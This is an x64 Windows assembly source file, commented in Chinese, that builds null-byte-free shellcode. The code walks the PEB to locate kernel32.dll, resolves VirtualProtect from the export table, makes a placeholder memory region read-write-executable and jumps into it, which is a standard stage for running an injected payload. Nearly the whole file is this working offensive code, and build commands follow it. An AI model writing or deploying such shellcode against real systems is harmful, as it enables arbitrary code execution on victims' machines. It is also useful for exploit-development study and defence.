section .text
    global _main

_main:
    push rbp                        ;栈帧操作
    mov rbp,rsp
    sub rsp,0x30

    xor r8,r8
    xor rcx,rcx
    xor r10,r10
    add r10,0x60					;直接gs:60h的话在转换成机器码时会出现00导致shellcode截断
		
	mov rax,[gs:r10]				;找到PEB,rax=PEB
	mov rax,[rax+0x18]				;rax = PEB->Ldr
	mov rsi,[rax+0x20]				;rsi = PEB->Ldr.InMemoryOrderModuleList
	lodsq							;获取ntdlll.dll模块			
	xchg rax,rsi					;交换rax与rsi的值
	lodsq							;获取kernel32.dll模块
	mov rbx,[rax+0x20]				;获取kernel32.dll的基址

    xor r8,r8						;异或将r8寄存器中每一位都清0
	mov r8d,[rbx+0x3C]				;R8D = Dos Header-> e_lfanew偏移量,因为Dos Header-> e_lfanew只占四个字节
	xor rdx,rdx
	mov rdx,r8						;rdx = r8 = Dos Header-> e_lfanew
	add rdx,rbx						;kernel32.dll基址+e_lfanew，rdx=PE Header
	mov rax,0xffffffffffffffff		;直接mov rax,88h可能会导致出现好几个字节的0
	sub rax,0xffffffffffffff77		;使用减法让rax等于88h
	mov r8d,[rdx+rax]				;导出表偏移地址存在位置88h，此地址为4字节
	add r8,rbx						;基址+偏移=导出表的物理地址
	xor rsi,rsi						;异或将rsi寄存器每一位都清0
	mov esi,[r8+0x20]				;获取导出表名称表偏移地址，此地址为4字节
	add rsi,rbx						;获取导出表名称表的物理地址
	xor rcx,rcx						;清空rcx寄存器,用于作为循环遍历的下标
	mov r9d,0x506C6175		        ;r9寄存器赋值为字符串VirtualP(倒叙放入)
    shl r9,0x20
    xor r10,r10
    mov r10d,0x74726956
    add r9,r10

									;获取VirtualProtect函数
GetFun:							    ;循环遍历获取函数
	    inc rcx						;rcx++
		xor rax,rax					;rax清0，用于存放函数名的物理地址
		mov eax,[rsi+rcx*4h]		;获取一个函数名称偏移地址，此地址为4字节
		add rax,rbx					;获取函数名称物理地址
		cmp qword [rax],r9			;让qword[rax],r9相减，但不保存结果只置标志位，相当于比较两值是否相同
		jnz GetFun					;如果标志位不为0则跳转，结合上面，相当于不相同则跳转
    
    xor rsi,rsi						;rsi清0，用于存放普通表的物理地址
	mov esi,[r8+24h]				;获取导出表中普通表的偏移，此地址为4字节
	add rsi,rbx						;偏移+基址=物理地址
	mov cx,[rsi+rcx*2h]				;功能的数量，此地址为2字节
	xor rsi,rsi						;rsi寄存器清0,用于存放偏移地址表的物理地址
	mov esi,[r8+1ch]				;导出表偏移地址表的偏移地址，此地址为4字节
	add rsi,rbx						;求出偏移地址表的物理地址
	xor rdx,rdx						;清空rdx，用于存放函数功能的物理地址
	mov edx,[rsi+rcx*4]				;获取到函数功能的偏移地址，此地址为4字节
	add rdx,rbx						;获取到物理地址
	mov rdi,rdx						;rdi=rdx

    sub rcx,rcx
    sub rdx,rdx
    sub r8,r8
    sub r9,r9
    sub rsi,rsi
    mov ecx,0x42414141             ;参数1：内存地址，此处最终应该改成一个有效的地址
    mov esi,0x41414141             ;加上低位到rsi，临时使用
	shl rcx,0x20                   ;左移设为高位
    add rcx,rsi                    ;给rcx加上低位
    push rcx                       ;地址入栈
    mov edx,0x1000                 ;参数2：内存大小，默认0x1000，如果需要更大的空间需要与shellcode所在的内存尺寸同步
    mov r8d,0x40                   ;参数3：PAGE_EXECUTE_READWRITE
    mov r9,rsp                     ;参数4：先前的访问保护值，此处不能使用0，应该填入一个有效的可写入地址
    call rdi                       ;调用VirtualProtect
    add rsp,0x8                    ;修正rsp指针
    pop rcx                        ;恢复rcx
    jmp rcx                        ;跳转执行
    
    mov rsp,rbp                    ;退出
    pop rbp
    ret

	;command line:
	;nasm -f win64 VirtualProtectSC.asm -o VirtualProtectSC.obj
	;link /out:vpsc.exe /entry:_main /subsystem:console /debug /pdb:vpsc.pdb VirtualProtectSC.obj